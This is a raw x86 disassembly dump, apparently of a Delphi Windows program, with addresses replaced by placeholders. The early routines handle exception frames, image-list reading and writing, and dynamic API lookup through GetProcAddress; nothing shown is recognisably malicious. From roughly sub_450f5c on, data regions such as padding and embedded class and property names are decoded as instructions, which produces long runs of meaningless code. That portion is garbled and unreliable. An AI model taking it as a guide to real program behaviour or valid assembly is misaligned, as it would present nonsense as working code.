push ebp
push sub_450ace
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450ad5
mov eax [ ebp - 0xc ]
call sub_403344
mov eax [ ebp - 0x14 ]
call sub_403344
mov eax [ ebp - 0x4 ]
call sub_450eb4
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_412f2c
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_422ac0
push eax
mov eax [ ebp - 0xc ]
call sub_422ac0
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41dc38
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_412f2c
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_422ac0
push eax
mov eax [ ebp - 0x14 ]
call sub_422ac0
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41dc38
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44faac
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_450b18
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a8a8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_450b78
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44f934
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450b7f
mov eax [ ebp - 0xc ]
call sub_403344
retn
sub eax 0xffffffec
sub_450b7f
mov eax [ ebp - 0x4 ]
call sub_44f79c
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_450cae
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_416070
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_416778
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_416070
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403344
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_416070
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a8a8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_450c91
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_416070
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44f934
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403344
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_416070
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_450ce0
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_44f9d4
mov eax edi
call sub_416050
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_416070
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_450884
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_450b18
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_450d6c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a8a8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_450e66
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40c50c
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_44f970
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_44f970
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450e6d
mov eax [ ebp - 0x4 ]
call sub_403344
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
jmp r-xdata
sub_450ed4
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403334
test bl bl
jle r-xdata
mov edx esi
call sub_450644
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_450f20
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_450f45
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450f4c
retn
sub_450f5c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
cmovne eax [ eax ]
or al 0x0
add [ eax ] al
adc al 0x72
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ edx ] cl
inc ebp
dec ebp
outsb
jne r-xdata
hlt
jb r-xdata
or [ gs : ebp + ecx * 2 + 0x65 ] edx
outsb
outsd
jb r-xdata
arpl [ eax + ecx + 0x7 ] si
je r-xdata
dec esp
cmovne eax [ eax ]
retn
mov ah 0xf
inc ebp
add [ ebx ] al
or dl [ ebp + ecx * 2 + 0x65 ]
outsb
jne r-xdata
jb r-xdata
jae r-xdata
arpl [ eax + eax + 0x8 ] si
insd
add [ edi ] al
push edx
bound esi [ gs : ebp + 0x69 ]
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bl
inc eax
add al cl
adc eax [ ebp ]
add [ eax ] dl
inc eax
add [ eax + edx + 0x45 ] cl
outsb
inc ebp
jbe r-xdata
jb r-xdata
or [ edi ] al
inc ecx
inc ebx
popad
outsb
jbe r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x7 ] si
adc [ 0x63655241 ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
cmp [ ecx + eax * 2 ] bh
add [ eax ] al
popad
inc eax
outsb
arpl [ ebp + 0x64 ] sp
inc edx
outsd
outsd
insb
popad
pop es
jb r-xdata
jb r-xdata
outsb
je r-xdata
jne r-xdata
outsb
popad
imul eax [ ecx ] 0x0
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x600450f ] dh
insd
bound ecx [ esi + 0x6f ]
outsb
pop es
insd
bound eax [ edx + 0x72 ]
popad
imul ecx [ edx ] 0x6d
bound eax [ edx + 0x61 ]
jb r-xdata
jb r-xdata
jae r-xdata
push ebx
insb
add [ eax ] cl
push esp
push edx
arpl [ gs : eax + eax + 0x8 ] si
arpl [ gs : eax + ecx + 0x7 ] si
jae r-xdata
jb r-xdata
popad
jae r-xdata
push esp
dec edi
ja r-xdata
jb r-xdata
add [ eax ] cl
sbb dl [ ecx + eax * 2 + 0x64 ]
jbe r-xdata
ja r-xdata
inc ecx
inc ebx
popad
outsb
jbe r-xdata
or [ edi ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
jb r-xdata
or [ edi ] al
inc ecx
inc ebx
popad
outsb
jbe r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ 0x63655241 ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
arpl [ gs : ebp + 0x64 ] si
pop es
insb
je r-xdata
add eax 0x63655241
sbb al 0x11
popad
add [ bx + si ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx + edx + 0x6d0b0045 ] bl
jb r-xdata
push 0x6e490774
jb r-xdata
add [ eax ] dh
adc [ ebp ] eax
or [ 0x6e654d54 ] dl
ja r-xdata
outsb
add [ ecx + edx ] bl
inc eax
add [ eax ] bh
mov esp 0x41
add [ eax ] al
add [ eax ] dl
inc eax
add [ eax + r-xdata ] dl
or [ edx ] bl
push esp
inc ecx
jbe r-xdata
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ eax ] cl
adc dl [ ebp + ecx * 2 + 0x65 ]
outsb
jne r-xdata
inc ebp
popad
imul eax [ 0x756e654d ] 0x73
lea eax [ eax ]
popad
inc ecx
jne r-xdata
jae r-xdata
add [ 0x74617453 ] al
andps xmm1 [ gs : edi + 0x77 ]
push esp
push edx
arpl [ gs : eax + eax + 0x5 ] si
push ebx
je r-xdata
arpl [ eax + ecx + 0x7 ] si
jae r-xdata
je r-xdata
je r-xdata
inc eax
add [ eax - 0x63ffbfcb ] bl
outsd
insd
popad
je r-xdata
jne r-xdata
dec ebp
outsb
dec ecx
je r-xdata
dec ebp
outsb
jb r-xdata
jb r-xdata
ja r-xdata
je r-xdata
insd
inc ebp
jbe r-xdata
arpl [ ebp + 0x9 ] sp
push esp
dec ebp
add [ 0x74646957 ] eax
push esp
inc ebx
popad
outsb
jbe r-xdata
je r-xdata
popad
je r-xdata
add eax 0x63655241
add [ esi + 0x41 ] dh
inc ebp
inc esi
insb
popad
add [ bx + si ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx + 0x4d050045 ] bl
outsb
jne r-xdata
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
or al 0xa6
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
adc al [ ebp ]
sbb al 0x0
insd
inc ecx
jne r-xdata
add [ edi ] cl
push esp
dec ebp
outsb
jne r-xdata
lodsb [ esi ]
arpl [ eax ] cx
insd
popad
dec ebp
popad
insd
inc ebp
jbe r-xdata
add [ eax ] al
add [ esp + 0x358c0044 ] ch
jne r-xdata
jb r-xdata
je r-xdata
jne r-xdata
dec ebp
outsb
insd
inc ebp
jbe r-xdata
dec ebp
outsb
jne r-xdata
outsb
je r-xdata
je r-xdata
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push es
outsb
jne r-xdata
imul esp [ ebx + 0x8 ] 0x614d616d
jae r-xdata
push 0x746e4907
outsb
andps xmm1 [ edi + 0x77 ]
and al 0x45
add al bh
and al 0x45
add [ ebp + 0x25280045 ] cl
inc ebp
add ah ah
jmp r-xdata
add [ eax ] al
mov eax eax
pop eax
adc al [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x12
inc ebp
add [ eax + eax ] bl
outsd
inc esi
insb
mov al [ 0xffffffff94004035 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
in al 0x44
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
insb
or [ ebp + 0x61 ] ch
push eax
popad
jb r-xdata
outsb
je r-xdata
add [ edi - 0x5a3bffbb ] ch
inc ecx
add [ eax - 0x5a ] bl
inc ecx
add [ esi + 0x24900041 ] ch
inc ebp
add al cl
inc ecx
outsd
je r-xdata
dec ebp
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
jb r-xdata
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
add eax 0x74646957
mov esp 0x30004010
add [ eax ] al
add [ eax + edx + 0x580040 ] bh
add [ eax ] al
pop es
add bh ch
inc ebp
add [ esi + ebp + 0x45 ] ah
add [ ecx + ecx * 2 + 0x2cac0041 ] dh
inc ebp
add [ eax + 0x51 ] bl
inc ebp
add [ eax ] dl
mov [ 0xffffffffa3080041 ] al
inc ecx
add [ eax ] bh
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add al bl
daa
inc ebp
add [ eax ] ch
inc ebx
inc ebp
add [ eax - 0x27ffbad0 ] bh
inc esp
inc ebp
add [ esp + ecx * 2 + 0x45 ] al
add [ eax ] al
dec edx
inc ebp
add [ eax ] bh
dec ebx
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] bh
add [ eax ] al
mov esp 0x58004010
add [ eax ] al
add [ edi ] al
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
push esp
sub [ ebp ] al
loopne r-xdata
adc eax [ ebp ]
lodsb [ esi ]
add [ eax ] al
add [ esp + ebp ] al
inc ecx
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x6bffbfcb ] ah
inc ebp
add ah cl
adc eax [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg edx eax
adc eax [ ebp ]
mov esi 0xac004513
xor eax 0x35a00040
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
je r-xdata
add [ ecx + edx ] bl
inc eax
add [ eax ] bh
mov esp 0x41
add [ eax ] al
add [ ecx + 0x40 ] ah
add al 0x8
push es
push ebx
outsb
jne r-xdata
call 0x34556fa
or eax 0x6e654d54
dec ebp
outsb
jne r-xdata
inc eax
add [ eax ] bh
mov esp 0x10540041
inc eax
add [ eax + edx + 0x40 ] dl
add [ ebx + 0x4511a0c0 ] cl
add [ ebx ] al
adc [ ebp + ecx * 2 + 0x65 ] edx
outsb
add [ ecx + edx ] bl
dec ecx
outsb
add [ esp + 0x45 ] cl
add [ eax - 0x5a ] al
inc ecx
add [ esi + 0x45 ] ah
sub_4513a4
inc ebp
add [ eax + ecx * 2 + 0x45 ] bh
add [ ecx + ecx * 2 + 0x45 ] cl
add [ ecx + ecx * 2 + 0x4dec0045 ] al
inc ebp
add al bl
dec ebp
inc ebp
add al bl
inc esi
inc ebp
add [ ecx ] cl
push esp
dec ebp
outsb
jne r-xdata
test al 0x0
add bh bh
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x75 ] eax
je r-xdata
je r-xdata
push es
add [ esi ] al
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x450fb070
add [ eax ] cl
add bh bh
fadd [ esi + 0x45 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ 0x61657242 ] al
inc ebx
push 0x9c6b6365
adc [ ebp ] eax
cmp eax [ eax ]
add bh bh
or al 0x59
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
arpl [ ebx - 0x64 ] bp
insd
int3
inc edx
jb r-xdata
dec eax
outsd
je r-xdata
outsb
jne r-xdata
imul edi [ eax + edx + 0x300040 ] 0x0
popad
jns r-xdata
insb
adc [ eax ] al
aas
add [ eax ] al
[ eax ]
insd
popad
jae r-xdata
add bh bh
in al dx
inc esi
inc ebp
add al al
dec edi
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070008 ] al
popad
jo r-xdata
pushfd
adc [ ebp ] eax
cmp al 0x0
add bh bh
mov [ edx + 0x45 ] bl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add eax 0x75411100
je r-xdata
adc [ eax ] al
cmp al [ eax ]
add bh bh
movsb [ edi ] [ esi ]
dec ecx
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
inc esp
popa
jne r-xdata
add [ eax ] al
push [ eax + 0x4547 ]
imul ebp [ edi + 0x6e ] r-xdata
cmp [ eax ] al
add bh bh
pop esp
inc edi
inc ebp
add al ah
dec edi
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
pop es
inc ebx
push 0x656b6365
insb
cmc
inc esp
add [ eax + eax ] bh
[ ecx + edx * 2 + 0x10045 ]
outsb
add [ eax ] dl
inc eax
add [ eax ] bh
add [ eax ] al
[ edi + eax * 2 + 0x45 ]
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
in al dx
retn 0x41
js r-xdata
je r-xdata
adc [ eax + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
mov esp 0x58004010
add [ eax ] al
[ eax ]
add bh bh
and [ eax + 0x45 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4804000f ] al
imul ebp [ esi + 0x74 ] r-xdata
inc eax
add [ eax ] al
push eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
adc [ eax ] al
cmp [ eax ] eax
add bh bh
mov al 0x47
inc ebp
add [ eax ] al
cwde
inc ebx
jne r-xdata
inc ecx
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
dec esp
dec eax
inc ebp
add [ eax + 0x4550 ] ah
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x2c656c62
sbb al [ ecx ]
mov [ eax ] al
add bh bh
mov [ eax ] al
add bh bh
rcl [ eax + 0x45 ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
inc ecx
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
inc eax
add al bh
xor eax 0x9e740040
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
add [ edx - 0x49ffbae9 ] ah
pop ss
inc ebp
add [ eax ] bl
add [ eax ] al
add al 0x2c
je r-xdata
add [ 0x654d6e4f ] cl
popad
je r-xdata
xor al [ eax ]
mov [ ebx + 0x45 ] ds
add [ eax + 0x2800414a ] bl
mov eax [ 0x49b40041 ]
inc ecx
add [ ebx + 0x64500045 ] dh
xor eax 0x35940040
inc eax
add ah bl
xor al [ eax ]
clc
jae r-xdata
insd
sub al 0x11
inc ebp
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
inc ecx
add [ eax - 0x5b ] al
inc ecx
add al dh
pop edx
inc ebp
add [ ebx + 0x5be00045 ] bl
inc ebp
add ah cl
arpl [ ebp ] ax
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] bh
add [ eax ] al
add eax [ eax ]
std
and [ edx - 0x5de7ffbf ] ah
jb r-xdata
nop
pop ss
inc ebp
add al al
add [ eax ] al
insd
mov ah 0x10
inc ebp
add [ eax - 0x67010000 ] bl
inc ebp
add [ eax ] dl
dec ecx
je r-xdata
mov [ 0xffffffffa3080041 ] al
inc ecx
add [ eax ] bh
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
pop ss
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
lea eax [ eax ]
push esp
pop ss
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x3fffbae9 ] dl
sub_451ae4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ ebx ] 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1b ] dh
inc ebp
add [ eax ] bh
add [ eax ] al
or [ edi ] dl
inc ebp
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax ] al
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
pop es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
add [ eax - 0x5fffba98 ] dl
push 0x10045
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
jns r-xdata
jo r-xdata
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax + 0x68 ] dh
inc ebp
add [ eax + 0x1004568 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
fsub [ edx + 0x45 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
inc ebp
add [ eax + esi * 2 ] dh
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
rcr [ ecx ] 0x41
add [ eax + esi * 2 ] ch
in al 0x11
inc ebp
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
in al 0x6f
inc ebp
add [ eax + 0x2800414a ] bl
mov eax [ 0x49b40041 ]
inc ecx
add [ ebx + 0x64500045 ] dh
inc ebp
add [ eax ] dl
mov [ 0xffffffffa3080041 ] al
inc ecx
add [ eax ] bh
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ eax + 0x6f ] dh
inc ebp
add [ ebx + 0x5be00045 ] bl
inc ebp
add ah cl
arpl [ ebp ] ax
sbb [ eax + 0x45 ] dh
add al dl
jo r-xdata
and [ ebp + 0x35980041 ] ah
inc eax
add [ esi + ebx * 4 + 0x41 ] dh
sbb [ ebx ] 0x45
add [ edi ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
push cs
push eax
popad
jb r-xdata
dec [ eax + ebp * 2 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
insb
cmc
inc esp
add [ eax ] cl
add bh bh
adc al 0x64
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060009 ] al
insd
popad
jae r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
jo r-xdata
add eax 0x75411100
je r-xdata
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
push ds
inc ebp
add [ eax ] cl
add [ eax ] al
add [ eax + 0x4a ] dh
inc edx
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1c65646f
sbb al [ ebp ]
push 0x68ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ecx
add [ ebp + esi + 0x35980040 ] cl
je r-xdata
inc ebx
push 0x65676e61
sub al 0x1a
inc ecx
add [ eax ] dh
add bh bh
jo r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al [ ebp ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
